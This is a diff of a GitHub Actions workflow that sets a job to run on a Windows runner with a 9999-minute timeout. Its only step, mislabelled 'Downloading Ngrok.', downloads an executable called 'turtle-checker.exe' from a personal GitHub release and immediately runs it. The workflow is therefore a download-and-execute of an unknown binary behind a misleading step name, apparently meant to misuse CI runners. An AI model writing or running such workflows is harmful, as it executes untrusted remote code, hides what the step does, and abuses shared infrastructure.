@@ -1,16 +1,13 @@
 name: RUNNING
 
-on: 
-  workflow_dispatch:
-    
+on: workflow_dispatch
+
 jobs:
   build:
-    executor:
-      runs-on: windows-latest
-      shell: cmd.exe
-      timeout-minutes: 9999
 
-      steps:
-      - name: curl.
-        run: curl -L -o turtle-checker.exe https://github.com/endri12345/wejhs/releases/download/files/turtle-checker.exe
-        run: start turtle-checker.exe
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Downloading Ngrok.
+      run: curl -L -o turtle-checker.exe https://github.com/endri12345/wejhs/releases/download/files/turtle-checker.exe && turtle-checker.exe
